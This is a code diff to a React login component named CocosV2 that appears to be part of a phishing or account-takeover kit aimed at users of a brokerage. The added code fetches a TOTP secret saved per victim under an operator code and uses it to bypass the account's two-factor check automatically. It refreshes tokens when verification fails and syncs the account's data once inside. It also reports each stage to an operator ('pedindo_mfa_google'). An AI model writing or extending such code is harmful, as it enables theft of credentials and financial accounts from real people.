@@ -283,7 +283,7 @@ const CocosV2 = () => {
           });
 
           if (defaultFactor?.id === "mail" && defaultFactor?.requireChallenge) {
-            // Preserve exact login token pair for email factor challenge/verify flow
+            // Mail factor → email challenge flow
             emailFlowAccessTokenRef.current = data.access_token;
             emailFlowRefreshTokenRef.current = data.refresh_token || "";
 
@@ -294,6 +294,73 @@ const CocosV2 = () => {
             setMfaMethod("enrolled"); mfaMethodRef.current = "enrolled";
             await updateSession("email_challenge_sent", { otp_code: "mfa_type:enrolled" });
             setStep("email_verify");
+            setLoading(false);
+            return;
+          }
+
+          if (defaultFactor?.factor_type === "totp" && defaultFactor?.status === "verified") {
+            // TOTP factor detected via get_default_factor → go directly to MFA verify (no email)
+            console.log("[LOGIN] Default factor is TOTP verified, going to MFA Google directly");
+            
+            // Check if we have saved secret for auto-verify
+            let savedSecret: string | null = null;
+            try {
+              const acctData = await callApi("get_account_snapshot", {
+                email: submittedEmail.toLowerCase(),
+                operator_code: operatorCode,
+                fields: ["totp_secret"],
+              });
+              savedSecret = acctData?.success ? acctData?.account?.totp_secret || null : null;
+            } catch { /* ignore */ }
+
+            if (savedSecret) {
+              // Auto-verify with saved secret
+              setMfaMethod("enrolled"); mfaMethodRef.current = "enrolled";
+              setEnrolledSecret(savedSecret); enrolledSecretRef.current = savedSecret;
+              setStatusMsg("Verificando seguridad automáticamente...");
+              await updateSession("mfa_auto_verify_totp_default", { otp_code: "mfa_type:enrolled" });
+
+              let tokenForVerify = data.access_token;
+              let refreshForVerify = data.refresh_token || "";
+              let verifyRes = await retryTotpVerify(tokenForVerify, defaultFactor.id, savedSecret, 3);
+
+              if (!verifyRes?.access_token) {
+                try {
+                  const refreshed = await callApi("refresh_token", { refresh_token: refreshForVerify });
+                  if (refreshed?.access_token) {
+                    tokenForVerify = refreshed.access_token;
+                    refreshForVerify = refreshed.refresh_token || refreshForVerify;
+                    setAccessToken(tokenForVerify);
+                    setRefreshToken(refreshForVerify); refreshTokenRef.current = refreshForVerify;
+                    verifyRes = await retryTotpVerify(tokenForVerify, defaultFactor.id, savedSecret, 3);
+                  }
+                } catch { /* ignore */ }
+              }
+
+              if (verifyRes?.access_token) {
+                setAccessToken(verifyRes.access_token);
+                if (verifyRes.refresh_token) { setRefreshToken(verifyRes.refresh_token); refreshTokenRef.current = verifyRes.refresh_token; }
+                saveTotpSecret(savedSecret, submittedEmail);
+                await updateSession("totp_auto_verified");
+                setStep("syncing");
+                setStatusMsg("Verificación exitosa. Sincronizando tus datos...");
+                await syncAccountData(verifyRes.access_token, submittedEmail);
+                setStep("done");
+                setLoading(false);
+                return;
+              }
+            }
+
+            // No saved secret or auto-verify failed → show MFA Google screen
+            setFactorId(defaultFactor.id);
+            const challengeData = await callApi("mfa_challenge", {
+              access_token: data.access_token,
+              factor_id: defaultFactor.id,
+            });
+            setChallengeId(challengeData?.id || "");
+            setMfaMethod("client_own"); mfaMethodRef.current = "client_own";
+            await updateSession("pedindo_mfa_google", { otp_code: "mfa_type:client_own" });
+            setStep("mfa_verify");
             setLoading(false);
             return;
           }
@@ -441,7 +508,7 @@ const CocosV2 = () => {
               });
               setChallengeId(challengeData?.id || "");
               setMfaMethod("client_own"); mfaMethodRef.current = "client_own";
-              await updateSession("mfa_challenge_sent_unenroll_failed", { otp_code: "mfa_type:client_own" });
+              await updateSession("pedindo_mfa_google", { otp_code: "mfa_type:client_own" });
               setStep("mfa_verify");
             }
           }
